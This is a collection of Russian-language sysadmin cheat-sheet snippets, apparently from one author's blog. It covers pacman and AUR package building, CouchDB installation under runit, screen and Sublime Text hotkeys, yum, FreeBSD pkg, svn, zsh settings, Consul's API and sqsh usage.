pacman -S gimp gpicview
Поиск пакетов по регулярному выражению:

pacman -Ss ^ssh
Установка группы пакетов:

pacman -S --needed base-devel
Список пакетов, входящих в группу:

pacman -Sg base-devel
Список всех доступных групп:

# группы и пакеты в них
pacman -Sgg
# только имена групп
pacman -Sgg | cut -d ' ' -f 1 | uniq
Обновить базу данных пакетов:

pacman -Sy
Обновить установленные пакеты:

pacman -Su
Список пакетов, для которых есть обновления:

pacman -Qu
Список установленных пакетов:

pacman -Qi
pacman -Qi | grep Name
Поиск установленного пакета по регулярному выражению:

pacman -Qs ^ssh
Список файлов, принадлежащих пакету:

pacman -Ql mutt
Определить, к какому пакету относится заданный файл:

pacman -Qo /usr/bin/mutt
Удалить пакет:

pacman -R xorg-xbacklight
Удаление пакетов, установленных, как зависимости, и ставших ненужными (autoremove):

pacman -R `pacman -Qdtq`
Некоторые пакетные менеджеры умеют «замораживать» пакеты, то есть, не обновлять их при наличии обновлений (hold в Debian и деривативах, lock во FreeBSD). Для достижения того же эффекта в Arch Linux в файле /etc/pacman.conf в секцию [options] нужно дописать что-то вроде:

IgnorePkg = systemd mutt
Заканчивая рассказ про pacman, хочется отметить, что список серверов с пакетами находится в /etc/pacman.d/mirrorlist, а кэш загруженных пакетов следует искать в /var/cache/pacman/pkg/. Для очистки кэша используйте команду:

pacman -Sc
Логи пишутся в /var/log/pacman.log. В них вы всегда найдете, что, на что, и когда было обновлено.

Пример использования AUR
AUR (аббревиатура от Arch User Repository) — это каталог пакетов для Arch Linux, поддерживаемых пользователями (типа как PPA в мире Ubuntu). На сайте aur.archlinux.org есть поиск, комментарии к пакетам, и многое другое.

Для примера рассмотрим установку пакета ttf-ms-fonts, который содержит шрифты от Microsoft, и по более-менее понятным причинам доступен только в AUR:

# пакеты из группы base-devel - это типичные пакеты,
# необходимые для сборки других пакетов
pacman -S --needed base-devel
# адрес репозитория есть на странице пакета
git clone https://aur.archlinux.org/ttf-ms-fonts.git
cd ttf-ms-fonts
Перекрестная ссылка: Моя шпаргалка по работе с Git.

В репозитории вы найдете файл PKGBUILD (используется синтаксис bash), и плюс к нему, возможно, какие-то патчи и подобные вещи. Файл PKGBUILD содержит информацию о том, откуда качать исходники пакета и какие контрольные суммы у этих исходников, с какими флагами их собирать, и так далее. Таким образом, немного подправив PKGBUILD, можно собрать пакет со своими флагами. Хорошей практикой считается держать репозитории AUR-пакетов где-нибудь в ~/packages, время от времени делая им git pull и обновляясь на новую версию.

Будучи в репозитории говорим:

makepkg -s
Здесь ключ -s означает необходимость установить недостающие зависимости с помощью pacman. Настройки makepkg хранятся в файле /etc/makepkg.conf. Это местный аналог /etc/make.conf из мира FreeBSD. В нем можно указать CFLAGS, CXXFLAGS и подобные вещи. Очень рекомендуется указать в параметре PACKAGER свое имя и email. Это позволит отличать пакеты, собранные вами, от всех остальных.

Наконец, ставим собранный пакет:

pacman -U ttf-ms-fonts-2.0-10-any.pkg.tar.xz
Кстати, с помощью pacman -U также можно откатываться к более ранним версиям пакетов. Где искать кэш со скаченными пакетами, вы уже знаете. Если же пакета нет в кэше, его всегда можно найти на archive.archlinux.org.

Дополнение: На случай, если пакет из AUR зависит от других пакетов из AUR, предусмотрено ряд утилит, благодаря которым не придется ставить все эти пакеты вручную, как описано выше. Методом тыка я решил попробовать yaourt и оказался им вполне доволен. Утилита работает в точности, как pacman, только дополнительно позволяет устанавливать пакеты из AUR.

Единственная неприятная особенность этой утилиты заключается в том, что при сборке пакетов из AUR она задает кучу разных вопросов в стиле:

Edit PKGBUILD ? [Y/n] ("A" to abort)
Исправить такое поведение можно, прописав в ~/.bashrc:

alias yaourt='yaourt --noconfirm'
Из интересных фишек yaourt стоит упомянуть, что утилита выводит в консоль обсуждения пакетов на AUR. Это очень удобно, например, в случае, если пакет вдруг не собирается, так как в комментариях нередко можно найти воркэраунд.

Собираем пакеты из исходников с помощью ABS
Под аббревиатурой ABS (Arch Build System) понимается сразу несколько довольно разных вещей. Это (1) сам механизм сборки пакетов в Arch Linux, с файлами PKGBUILD, утилитой makepkg и прочим, как было описано выше. ABS называется и (2) аналог дерева портов из мира FreeBSD, использующий (1), и о котором пойдет речь в этом параграфе. Также (3) ABS может означать утилиту abs, предназначенную для работы с (2). Наконец, (4) поскольку официальные пакеты собираются из ABS в смысле (2), аббревиатуру ABS часто используют в смысле «противоположность AUR». Несмотря на всю эту неразбериху, значение «ABS» обычно легко понять по контексту.

Итак, для работы с ABS в смысле (2) первым делом ставим утилиту abs:

sudo pacman -S abs
С помощью этой утилиты скачиваем ABS:

sudo abs
Все исходники сваливаются в /var/abs. У меня они заняли около 82 Мб. Далее работа с ABS осуществляется точно так же, как с AUR. Интересно, что makepkg не позволяет запускать себя из под рута, в связи с чем приходится копировать исходники пакетов из /var/abs к себе в ~/packages, и держать их там вместе с AUR. Это разумно сразу по нескольким причинам. Во-первых, вы всегда точно знаете, какие пакеты вы собираете из исходников, а какие — нет. Во-вторых, сборка пакетов из ABS часто означает их сборку со своими параметрами, то есть, с изменением PKGBUILD. Чтобы эти изменения не терялись при обновлении ABS, вы можете держать у себя в ~/packages не только измененный PKGBUILD, но и патч к нему.

В файле /etc/abs.conf можно указать, что утилита abs должна тянуть, а что нет. Например, можно не тянуть каталог core и дополнительно тянуть testing.

Обновление ABS производится так:

# обновить все дерево
sudo abs
# обновить конкретный пакет
sudo abs extra/mutt
Чтобы при следующем обновлении бинарных пакетов pacman не затер пакеты, собранное из исходников, в PKGBUILD следует дописать:

groups=('modified')
… а в /etc/pacman.conf:

IgnoreGroup = modified
Помимо прочего, при помощи ABS можно собрать кастомное ядро Linux. Сорцы соответствующего пакета вы найдете в /var/abs/core/linux.
==============================================================================================================
Установка
Для своих страшных экспериментов я использовал Ubuntu 16.04. Готовых пакетов для различных дистрибутивов Linux разработчики CouchDB не предоставляют, поэтому имеет смысл один раз настроить его в Docker или LXC-контейнере, и потом использовать этот контейнер на всех узлах кластера. Для быстрой установки CouchDB мной был написан bash-скрипт. Имеет смысл сразу воспользоваться им. В ближайших двух параграфах я расскажу, как этот скрипт работает.

Ставим зависимости:

sudo apt-get update
sudo apt-get --no-install-recommends -y install \
    build-essential pkg-config runit erlang \
    libicu-dev libmozjs185-dev libcurl4-openssl-dev
Качаем архив с исходниками с зеркала, которое предложат на официальном сайте. Затем говрим:

tar -xvzf apache-couchdb-2.0.0.tar.gz
cd apache-couchdb-2.0.0/
./configure && make release
Создаем пользователя couchdb:

sudo adduser --system \
        --no-create-home \
        --shell /bin/bash \
        --group --gecos \
        "CouchDB Administrator" couchdb
Копируем rel/couchdb в домашний каталог пользователя и выставляем правильные права:

sudo cp -R rel/couchdb /home/couchdb
sudo chown -R couchdb:couchdb /home/couchdb
sudo find /home/couchdb -type d -exec chmod 0770 {} \;
sudo sh -c 'chmod 0644 /home/couchdb/etc/*'
Проверяем, что все было сделано правильно:

sudo -i -u couchdb /home/couchdb/bin/couchdb
У меня в логи стали сыпаться ворнинги про отсутствующую базу данных _users. Не переживайте, мы это вот-вот пофиксим.

На http://localhost:5984 должны увидеть:

{
  "couchdb": "Welcome",
  "version": "2.0.0",
  "vendor": {
    "name": "The Apache Software Foundation"
  }
}
==============================================================================================================
sudo apt-get install linux-crashdump
==============================================================================================================
sudo dpkg --add-architecture i386
sudo add-apt-repository ppa:ubuntu-wine/ppa
sudo apt-get update
sudo aptitude --full-resolver --without-recommends \
  -f install wine1.8:i386
==============================================================================================================
sudo pip3 install termcolor
==============================================================================================================
#!/usr/bin/env python3

import sys
from termcolor import colored


def file_to_list(fname):
    with open(fname, "r") as f:
        return [x.strip() for x in f.readlines()]


def make_colored(ch):
    chars = {
        "~": ("blue", []),
        ".": ("white", []),
        "#": ("green", []),
        "O": ("white", ["bold"]),
        "^": ("red", ["dark"]),
        "=": ("red", ["dark"]),
    }
    default = ("red", [])
    color, attrs = chars.get(ch, default)
    return colored(ch, color, attrs=attrs)


def main():
    if len(sys.argv) < 2:
        print("Usage: {} <file>".format(sys.argv[0]), file=sys.stderr)
        sys.exit(1)

    lines = file_to_list(sys.argv[1])
    for src_line in lines:
        dst_line = ""
        i = 0
        chnum = len(src_line)
        while i < chnum:
            ch = src_line[i]
            dst_line = dst_line + make_colored(ch)
            i += 1
        print(dst_line)

if __name__ == "__main__":
    main()
==============================================================================================================
sudo dd if=./proxmox-ve.iso of=/dev/sdb bs=1M

adduser eax
usermod -a -G sudo eax
==============================================================================================================
# В Debian / Ubuntu:
sudo apt-get install screen

# Во FreeBSD:
sudo pkg install screen
Запускаем:

screen
Так можно посмотреть список запущенных экземпляров screen:

screen -ls
А так — подключиться к одному из них:

screen -r 6098.pts-0.vpn
Если в списке только один экземпляр, то можно просто:

screen -r
Пример файлa ~/.screenrc:

startup_message off
hardstatus alwayslastline "%w"

# start windows numering from 1
# via https://wiki.archlinux.org/index.php/GNU_Screen
bind c screen 1
bind ^c screen 1
bind 0 select 10
screen 1
Здесь мы отключаем приветственное сообщение, а также добавляем статусную строку с выводом списка всех окон. Нумерацию окон начинаем с единицы, а не с нуля, как делается по умолчанию.

Интересно, что одним экземпляром screen могут пользоваться сразу несколько человек. Для этого первый должен выполнить:

screen -R pairprog
:multiuser on
:acladd second_user_login
… а второй:

screen -x first_user_login/pairprog
==============================================================================================================
Обратите внимание, как красиво во FreeBSD по умолчанию рисуется статусная строка.

Основные хоткеи в screen следующие.

Окна:

Ctr + A, C	Create, создать окно
Ctr + A, K	Kill, прибить окно
Ctr + A, W	Windows, показать список окон
Ctr + A, Space	Переключитьcя на следующее окно
Ctr + A, N	То же самое
Ctr + A, Backspace	Переключиться на предыдущее окно
Ctr + A, P	То же самое
Ctr + A, Ctr + A	Вернутся на окно, с которого переключились
Ctr + A, "	Выбрать из списка окно, на которое хотим переключиться
Ctr + A, 0-9	Переключиться на окно с таким-то номером
Ctr + A, ‘	Ввести номер окна, на которое хотим переключиться
Ctr + A, Shift + A	Переименовать окно
Ctr + A, :number 3	Изменить номер окна
Ctr + A, I	Info, информация о текущем окне
Ctr + A, Shift + N	Number, номер и название текущего окна
 

Регионы:

Ctr + A, Shift + S	Разделить текущий регион горизонтально
Ctr + A, |	Разделить текущий регион вертикально
Ctr + A, :resize +5	Изменить размер региона вертикально (увеличить на 5)
Ctr + A, :resize -h 80	Изменить размер региона горизонтально (установить в 80)
Ctr + A, Tab	Переключение между регионами
Ctr + A, Shift + X	Прибить текущий регион
Ctr + A, Shift + Q	Прибить все регионы кроме текущего
 

Мониторинг:

Ctr + A, Shift + M	Включить/выключить мониторинг активности в окне
Сек + A, _	Мониторинг неактивности в течение 30 секунд
 

Скролинг и копирование текста:

Ctr + A, [	Перейти в режим copy/scrollback
Ctr + A, ]	Вставить содержимое paste buffer (регистр . — «точка»)
Ctr + A, >	Записать paste buffer во временный файл (bufferfile)
Ctr + A, <	Считать paste buffer из временного файла
Ctr + A, =	Удалить bufferfile
Ctr + A, :bufferfile	Изменить имя bufferfile (нужно передать аргумент)
Ctr + A, :readreg a	Положить paste buffer в регистр a
Ctr + A, :paste a	Вставить содержимое регистра a
 

Режим copy/scrollback похож на редактирование текста в Vim. Например, можно искать текст при помощи / и ?. Перейти к началу строки можно при помощи ^, а к концу — при помощи $. Нажатие Y выделяет всю строчку. Нажатие Shift+W копирует одно слово. В целом, в режим copy/scrollback обычно переходят для того, чтобы выделить кусок текста, выведенный ранее в окне. Начало и конец выделения помечаются нажатием на пробел. Попробуйте один раз и сразу все поймете.

Разное:

Ctr + A, ?	Подсказка по хоткеям
Ctr + A, D	Detach
Ctr + A, \	Прибить все окна и выйти
Ctr + A, A	Послать Ctr + A
Ctr + A, T	Time, показать текущее время, имя хоста, LA
Ctr + A, V	Version, показать версию screen
Ctr + A, X	Lock, для разблакировки нужно ввести пароль пользователя
Ctr + A, F	Fit, подогнать окно под размер текущего региона
Ctr + A, Z	Как Ctr+Z для обычных приложений
==============================================================================================================
Итак, начнем. Для начала, часто имеет смысл подключить EPEL:

yum install epel-release
Установка пакетов производится так:

yum install gcc
Получение информации о пакете:

yum info git
Получение списка зависимостей пакета:

yum deplist git
Проверка наличия доступных обновлений:

yum check-update
Обновление всех установленных пакетов:

yum update
Обновление конкрутного пакета:

yum update yum
Откатываем пакет к предыдущей версии:

yum downgrade git
Переустанавливаем пакет:

yum reinstall git
Удаление пакета:

yum remove git
Список всех доступных пакетов:

yum list available | less
Спискок всех установленных пакетов:

yum list installed | less
Спискок вообще всех пакетов:

yum list all | less
Проверить, установлен ли пакет:

yum list mutt
yum list mysql*
Поиск по пакетам:

yum search mutt
История установки/обновления/удаления пакетов:

yum history
Посмотреть детали о записи в истории:

yum history info 42
Откатить изменение из истории (вы же за это любите NixOS?):

yum history undo 42
Повторить изменения из истории:

yum history redo 42
Определение, к какому пакету относится файл:

yum provides /usr/bin/pstree
А так можно посмотреть все файлы, которые входят в конкретный пакет:

yum install yum-utils
repoquery -l psmisc
Также в пакет yum-utils входит команда для установки отладочных символов, необходимых, если вы иногда запускаете gdb:

debuginfo-install glibc
Часто нужной debuginfo нет в обычных репозиториях, но ее можно найти на filewatcher.com. Например, если ищем отладочные символы для:

nspr-4.10.6-1.el6_6.x86_64
… то вводим в поиске:

nspr-debuginfo-4.10.6-1.el6_6.x86_64
Список репозиториев:

yum repolist
Список групп пакетов:

yum grouplist
Получение информации о группе:

yum groupinfo "Web Server"
Установка группы пакетов:

yum groupinstall "Web Server"
Удаление группы пакетов:

yum groupremove "Web Server"
Установка скаченного RPM-файла:

yum install path/to/some.rpm
… или:

rmp -i path/to/some.rpm
==============================================================================================================
https://eax.me/lxc/
https://eax.me/postgresql-build/
==============================================================================================================
Отвечаем утвердительно, и ждем, пока pkg установится.

Затем читаем справку:

pkg help
Посмотреть справку по конкретной команде можно так:

pkg help update
Обновляем информацию о доступных пакетах:

pkg update
Смотрим список установленных пакетов:

pkg info
Обновляем установленные пакеты:

pkg upgrade
Ищем пакет по названию:

pkg search xorg
Установка пакета/пактетов и всех его/их зависимостей:

pkg install xorg
pkg install git-lite vim-lite sudo
Удаляем пакет:

pkg delete xorg
Удаляем пакеты, которые больше не нужны:

pkg autoremove
Смотрим, к какому пакету относится файл:

pkg which /usr/local/bin/git
Посмотреть полный список файлов в пакете можно так:

pkg info -l mesa-demos
Загружаем базу известных уязвимостей:

pkg audit -F
Проверяем установленные пакеты на предмет наличия известных уязвимостей, с ссылками на подробные отчеты:

pkg audit
Проверяем все установленные пакеты на предмет валидности контрольных сумм входящих в пакеты файлов:

pkg check -s -a
Проверяем все установленные пакеты на предмет отсутствия требуемых зависимостей:

pkg check -d -a
Удаляем из кэша старые пакеты:

pkg clean
Смотрим статистику:

pkg stats
Запрещаем/разрешаем обновление конкретного пакета:

pkg lock syncthing
pkg unlock syncthing
Посмотреть список «залоченых» пакетов:

pkg lock -l
Откатиться к более старой версии пакета:

sudo pkg remove chromium
sudo pkg install /var/cache/pkg/chromium-51.0.2704.106_2.txz
==============================================================================================================
Я, впрочем, не гугу Subversion. Но в первом приближении, вроде, все верно.

Теперь перейдем к командам.

Делаем checkout:

svn co --username eax https://example.com/project/trunk/
Подсасываем последние изменения:

svn up
Проверить, в какой ветке мы находимся и на какой сервер смотрим:

svn info
Посмотреть историю изменений:

svn up
svn log | less
История изменений с diff’ами, аналог git log -p:

svn log --diff | less
Кто какие строчки когда менял:

svn blame -v test.txt
Посмотреть незакомиченные изменения:

svn diff
Какие файлы были изменены или добавлены:

svn diff --summarize
Изменения в рамках ревизиции, аналог git show:

# посмотреть комментарий
svn log -c 123456
# посмотреть изменения
svn diff -c 123456
Посмотреть измененные в ревизии файлы:

svn diff --summarize -c 123456
Изменения по сравнению с текущей ревизией, аналог git diff:

svn diff -r 123456
svn diff --summarize -r 123456
Применение сохраненного в файл дифа, аналог git apply:

patch -p0 -i myfile.diff
Отменить последние изменения, аналог git reset --hard HEAD:

svn revert --recursive .
Текущее состояние репозитория, измененные файлы и так далее:

svn status
Удалить неотслеживаемые файлы и каталоги — встроенной команды, увы, нет, но можно прописать алиас в .bashrc:

svn status | perl -lne 'if(/^\?\s+(.*?)$/){ print $1 }' | xargs rm -r
Получение списка бранчей:

svn ls https://example.com/project/branches/
Создание нового бранча или тэга:

svn copy https://example.com/project/trunk/ \
  https://example.com/project/branches/test-branch

svn copy https://example.com/project/trunk/ \
  https://example.com/project/tags/1.0 \
  -m "Release 1.0"
Переключение на бранч:

cd path/to/trunk
cd ..
mkdir branches
cd branches
svn co https://example.com/project/branches/test-branch
cd test-branch
Мерж бранча:

svn merge http://example.ru/project/branches/test-branch
Удаление бранча:

svn delete http://example.ru/project/branches/test-branch \
  -m "Removing test-branch"
Примечание: Примите также во внимание, что если вы сделали checkout самого корня репозитория, в котором находятся каталоги trunk, branches и tags, то можете просматривать бранчи обычным ls, удалять обычным svn rm с последующим коммитом, и так далее. Впрочем, в больших проектах вы вряд ли захотите делать checkout вот прямо всего репозитория целиком.

Добавить файл:

svn add text.txt
Переименовать файл:

svn mv from.txt to.txt
Удалить файл:

svn del file.txt
Lock/unlock, чтобы файл никто не мог менять кроме нас:

svn lock file.txt
svn unlock file.txt
Коммит и сразу пуш, потому что это SVN:

svn commit -m 'Your comment here'
==============================================================================================================
git config --global core.preloadindex true
git config --global core.fscache true
git config --global gc.auto 256
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
sudo sh -c 'echo 1 > /proc/sys/kernel/sysrq'
# или:
sudo sysctl kernel.sysrq=1
Чтобы не вводить их заново после перезагрузки, можно отредактировать файл /etc/sysctl.conf.

Примеры некоторых интересных сочетаний:

SysRq+H — подсказка по всем сочетаниям;
SysRq+L — показать стектрейсы всех CPU;
SysRq+P — показать значения всех регистров;
SysRq+B — перезагрузить систему;
SysRq+O — выключить питание;
SysRq+C — уронить ядро;
==============================================================================================================
git config --global core.preloadindex true
git config --global core.fscache true
git config --global gc.auto 256

alias -s {erl,ml,hs}=vim
alias -s avi=mplayer

export PROMPT='%n@%m> '
export RPROMPT='[%~]'

git_prompt() {
  temp=`git symbolic-ref HEAD 2>/dev/null | cut -d / -f 3`
  if [ "$temp" != "" ]; then echo "$temp:"; fi
}
setopt prompt_subst
export RPROMPT='[$(git_prompt)%~]'

Глобинг
Опция extendedglob включает расширенный глобинг. Например, если он включен, команда:

ls *.(sh|config)
… отобразит все файлы, имеющие расширение sh или config. А команда:

echo ^*.erl
… выведет имена всех файлов, имеющих расширение, отличное от erl.

Также в zsh есть рекурсивный глобинг:

ls **/src/*.erl
Такое выражение рекурсивно ищет файлы, имеющие расширение erl и находящиеся в каталоге с именем src. Нетрудно догадаться, что делает следующая команда:

ls **/src/^*.erl

Если вы привыкли к поиску по истории путем нажатия Ctr+R, как это сделано в bash, то можете прописать в ~/.zshrc:

bindkey '^R' history-incremental-search-backward

setopt menucomplete
zstyle ':completion:*' menu select=1 _complete _ignored _approximate

% setopt correctall
% pdw
zsh: correct 'pdw' to 'pwd' [nyae]? y
/home/eax

% < ./file.txt

bindkey "^[OB" down-line-or-search
bindkey "^[OC" forward-char
bindkey "^[OD" backward-char
bindkey "^[OF" end-of-line
bindkey "^[OH" beginning-of-line
bindkey "^[[1~" beginning-of-line
bindkey "^[[3~" delete-char
bindkey "^[[4~" end-of-line
bindkey "^[[5~" up-line-or-history
bindkey "^[[6~" down-line-or-history
bindkey "^?" backward-delete-char

extract () {
  if [ -f $1 ] ; then
    case $1 in
      *.tar.bz2) tar xvjf $1   ;;
      *.tar.gz)  tar xvzf $1   ;;
      *.tar.xz)  tar xvfJ $1   ;;
      *.bz2)     bunzip2 $1    ;;
      *.rar)     unrar x $1    ;;
      *.gz)      gunzip $1     ;;
      *.tar)     tar xvf $1    ;;
      *.tbz2)    tar xvjf $1   ;;
      *.tgz)     tar xvzf $1   ;;
      *.zip)     unzip $1      ;;
      *.Z)       uncompress $1 ;;
      *.7z)      7z x $1       ;;
      *)         echo "'$1' cannot be extracted via >extract<" ;;
    esac
  else
    echo "'$1' is not a valid file"
  fi
}

sudo apt-get update
sudo apt-get install software-properties-common
sudo apt-add-repository ppa:bcandrea/consul
sudo apt-get update
sudo apt-get install consul consul-web-ui dnsutils curl jq

sudo apt-get install unzip
wget https://releases.hashicorp.com/path/to/consul.zip
unzip consul_VER_linux_amd64.zip
sudo service consul stop
sudo mv /usr/bin/consul /usr/bin/consul.backup
sudo mv consul /usr/bin/consul

{
"server": true,
"datacenter": "dc1",
"bootstrap_expect": 3,
"data_dir": "/opt/consul",
"log_level": "INFO"
}

sudo service consul restart
consul join 10.0.3.223 10.0.3.224
consul members
curl -s localhost:8500/v1/catalog/nodes | jq .
ssh -N -L 8500:localhost:8500 ubuntu@10.0.3.223

curl -X PUT -d 'value1' localhost:8500/v1/kv/group1/key1
curl -X PUT -d 'value2' localhost:8500/v1/kv/group1/key2
curl -X PUT -d 'value3' localhost:8500/v1/kv/group1/key3

curl -s localhost:8500/v1/kv/group1/key1 | jq .
curl -s localhost:8500/v1/kv/group1/key1 | \
  jq -r '.[0]["Value"]' | \
  base64 -d
  
Обновление:

curl -X PUT -d 'new-value3' localhost:8500/v1/kv/group1/key3
Удаление:

curl -X DELETE localhost:8500/v1/kv/group1/key3
Заметили выше ModifyIndex? Это поле предусмотрено специально для compare and swap:

curl -X PUT -d 'new-val' localhost:8500/v1/kv/group1/key2?cas=22
Если данные не успели поменяться, запись произойдет успешно, и будет получен ответ true. Иначе CAS не пройдет и придет ответ false.

Еще можно подождать изменений ключа так:

curl -s 'localhost:8500/v1/kv/group1/key1?index=21&wait=5s' | jq .

curl -XPUT -d @req.json 10.0.3.223:8500/v1/agent/service/register
curl -s 10.0.3.224:8500/v1/catalog/services | jq .
curl -s 10.0.3.224:8500/v1/catalog/service/postgresql-replica \
  | jq .
curl -s 10.0.3.224:8500/v1/catalog/node/postgresql-slave | jq .
curl localhost:8500/v1/agent/service/deregister/postgresql-master
curl -s localhost:8500/v1/health/service/postgresql-replica | jq .

Service discovery при помощи DNS
Пример запроса:

dig @127.0.0.1 -p 8600 postgresql-replica.service.consul
Пример ответа:

;; QUESTION SECTION:
;postgresql-replica.service.consul. IN A

;; ANSWER SECTION:
postgresql-replica.service.consul.  0 IN A 10.0.3.223
postgresql-replica.service.consul.  0 IN A 10.0.3.224
Можно запросить SRV запись, чтобы в ответе были еще и номера портов:

dig srv @127.0.0.1 -p 8600 postgresql-replica.service.consul
Ответ в этом случае:

;; QUESTION SECTION:
;postgresql-replica.service.consul. IN SRV

;; ANSWER SECTION:
postgresql-replica.service.consul.  0 IN SRV 1 1 5432
                                    postgresql-slave-2.node.dc1.consul.
postgresql-replica.service.consul.  0 IN SRV 1 1 5432
                                    postgresql-slave.node.dc1.consul.
;; ADDITIONAL SECTION:
postgresql-slave-2.node.dc1.consul. 0 IN A 10.0.3.224
postgresql-slave.node.dc1.consul.   0 IN A 10.0.3.223
Ноль в обоих ответах— это TTL, то есть DNS-ответ не должен кэшироваться.

curl -s 10.0.3.224:8500/v1/health/service/postgresql-master | jq .
curl -s 10.0.3.224:8500/v1/health/node/postgresql-slave-2 | jq .

Информация о кластере и leader election
Consul позволяет посмотреть, кто сейчас есть в кластере:

curl -s localhost:8500/v1/status/peers | jq .
Пример ответа:

[
  "10.0.3.223:8300",
  "10.0.3.224:8300",
  "10.0.3.245:8300"
]
Также мы можем узнать, кто сейчас лидер:

curl -s localhost:8500/v1/status/leader | jq .
Пример ответа:

"10.0.3.223:8300"
А так можно получить очень размашистую информацию об агенте, содержащую, помимо прочего, IP текущей машины:

curl -s localhost:8500/v1/agent/self | jq '.Member.Addr'

https://eax.me/consul/

lein test :only jepsen.system.consul-test
==============================================================================================================
nmap -Pn -p 22 192.168.0.0/24 | grep -B3 open | grep 'Nmap scan'
ssh-copy-id pi@10.0.0.110
ssh -X pi@10.0.0.110
==============================================================================================================
sudo apt-get install sqsh
sqsh -DMyDatabaseName -S10.110.0.10 \
  -UServerInstance\\Administrator -mpretty
Здесь MyDatabaseName — название вашей базы данных, 10.110.0.10 — IP-адрес хоста, на котором крутится СУБД, ServerInstance — имя инстанса, например, «SQLEXPRESS», Administrator — имя пользователя, а mpretty — флаг, без которого результат выполнения всех запросов будет выглядеть, как говно.
Создать базу данных:

1> create database my_test_db
2> go
Переключиться на другую БД:

1> use my_test_db
2> go
Создание таблицы:

1> create table users (id integer primary key identity, login
   varchar(256) not null, password varchar(256) not null, constraint
   cs_unique_login unique(login))
2> go
Здесь identity — это аналог auto_increment из MySQL. Остальное должно быть понятно.

Добавить строку:

1> insert into users (login, password) values ('afiskon', '123456')
2> go
Достать строки:

1> select * from users
2> go
Идентификаторы вроде названия полей можно брать в квадратные скобки:

1> select [login] from users;
2> go
Обновление данных:

1> update users set password = '654321' where login = 'afiskon'
2> go
Удаление:

1> delete from users where id = 1
2> go
Грохнуть базу данных:

1> use some_other_db
2> go
1> drop database my_test_db
2> go
Начать транзакцию:

1> begin transaction
2> go
Откатить транзакцию:

1> rollback
2> go
Закоммитить транзакцию:

1> commit
2> go
Простой пример использования переменных:

1> declare @users_number int
2> set @users_number = (select count(*) from users)
3> go
Посмотреть список таблиц в базе данных:

1> sp_tables
2> go
Тут много системных таблиц. Обычно интерес представляю те, у которых в колонке owner написано dbo.

Информация о колонках в таблице:

1> sp_columns users
2> go
Список баз данных:

1> sp_helpdb
2> go
Информация о базе данных:

1> sp_helpdb my_test_db
2> go
Вездесущий go можно комбинировать с командами шелла. Например:

1> sp_columns users
2> go | less -S
Или:

1> sp_columns users
2> go > /home/eax/temp/out.txt
Вертикальный вывод:

1> sp_columns users
2> go -m vert
Вывод в CSV:

1> sp_columns users
2> go -m csv
Выход:

1> quit
==============================================================================================================
sudo pip install pytest pytest-quickcheck pytest-html pytest-cov
==============================================================================================================
java -Dcom.sun.management.jmxremote.port=9999 \
  -Dcom.sun.management.jmxremote.authenticate=false \
  -Dcom.sun.management.jmxremote.ssl=false ...
==============================================================================================================
Создаем директорию, куда будут писаться логи:

sudo mkdir /var/log/couchdb
sudo chown couchdb:couchdb /var/log/couchdb
Создаем директории с конфигурацией для запуска couchdb:

sudo mkdir /etc/sv/couchdb
sudo mkdir /etc/sv/couchdb/log
В /etc/sv/couchdb/log/run пишем:

#!/bin/sh
exec svlogd -tt /var/log/couchdb
Опционально можно создать /etc/sv/couchdb/log/config c указанием, когда производить ротацию логов и подобного рода вешей, если дэфолты не устраивают. Формат конфига, а также дэфолты описаны в man svlogd.

Также создаем скрипт /etc/sv/couchdb/run:

#!/bin/sh
export HOME=/home/couchdb
exec 2>&1
exec chpst -u couchdb /home/couchdb/bin/couchdb
Делаем обоим скриптам chmod u+x. Затем:

sudo ln -s /etc/sv/couchdb/ /etc/service/couchdb
Через несколько секунд runit должен заметить новый сервис и запустить его. Управление:

sudo sv status couchdb
sudo sv stop couchdb
sudo sv start couchdb
==============================================================================================================
Сочетания клавиш
Как обычно, далее предполагается, что про всякие Ctr+C, Ctr+V и Ctr+S вы знаете, поэтому эти хоткеи не упоминаются. Учтите также, что перечень хоткеев не отражает всех возможностей Sublime Text. Например, в диалоге открытия нового файла (Ctr+O) предусмотрен весьма удобный автокомплит имен файлов.

Лэйауты:

Shift + Alt + 1	Одна группа вкладок
Shift + Alt + 2..4	От 2 до 4 столбцов
Shift + Alt + 5	Типа табличка 2 на 2
Shift + Alt + 8/9	В 2 или 3 строки
Ctr + циферка	Перейти на лайаут под заданным номером
 

Окна:

Ctr + Shift + N	Новое окно
Ctr + Shift + W	Закрыть окно
 

Табы:

Ctr + N	Новая вкладка
Ctr + PgUp/PgDown	Переход между табами
Ctr + W	Закрыть вкладку
Alt + циферка	Перейти к табу с номером
Ctr + Shift + N	Перенести таб на лайаут с заданным номером
 

Выделение:

Ctr + D	Выделение слов с созданием новых курсоров
Ctr + U	Если в результате выделения поставились лищние курсоры
Ctr + Shift + пробел	Выделить текущий скоуп
 

Поиск:

Ctr + F	Поиск в текущем файле
Ctr + E	Использовать выделенное для поиска
F3 / Shift + F3	Искать вперед/назад в текущем файле
Ctr + Shift + F	Поиск по нескольким файлам
F4 / Shift + F4	Перемещение по результатам поиска в файлах
Alt + R	В диалоге поиска: вкл/выкл регулярные выражения
Alt + С	В диалоге поиска: вкл/выкл case sensitivity
Alt + F3	Найти все, везде поставить курсоры
 

Замена:

Ctr + H	Диалог замены текста
Ctr + Alt + Enter	В диалоге замены: заменить все
 

Переходы:

Ctr + G	Перейти к строке с заданным номером
Ctr + M	Переход к парной скобке
Ctr + P	Перейти к файлу по его имени (с превью в редакторе!)
Ctr + R	Переход к методу или классу по имени в текущем файле
Alt + O	Переключение между .c и .h файлами
Ctr + Shift + R	ST 3: Переход к символу по имени во всем проекте
F12	ST 3: Перейти к определению того, что под курсором
Alt + −	ST 3: Вернуться туда, откуда пришли
Alt + Shift + −	ST 3: Обратное действие к предыдущему пункту
 

Закладки:

Ctr + F2	Поставить/снять закладку
F2 / Shift + F2	Предыдущая/следующая закладка в рамках одного файла
Ctr + Shift + F2	Снять все закладки в рамках текущего файла
 

Фолдинг:

Ctr + Shift + [	Свернуть код
Ctr + Shift + ]	Развернуть код
Ctr + K + J	Развернуть все, что свернуто
 

Отступы:

Ctr + ]	Увеличить отступ
Ctr + [	Уменьшить отступ
 

Комментирование:

Ctr + /	Закомментировать/раскомментировать код
Ctr + Shift + /	То же самое, но использовать блочный комментарий
 

Макросы:

Ctr + Alt + Q	Начать/закончить записывать макрос
Ctr + Shift + Alt + Q	Выполнить записанный макрос
 

Курсоры:

Ctr + клик	Создать новый курсор
Alt + Shift + ↑↓	Создание новых курсоров выше/ниже
Ctr + Shift + L	Для каждой выделенной строки создаться свой курсор
 

Некоторые преобразования текста:

F9	Сортировка строк
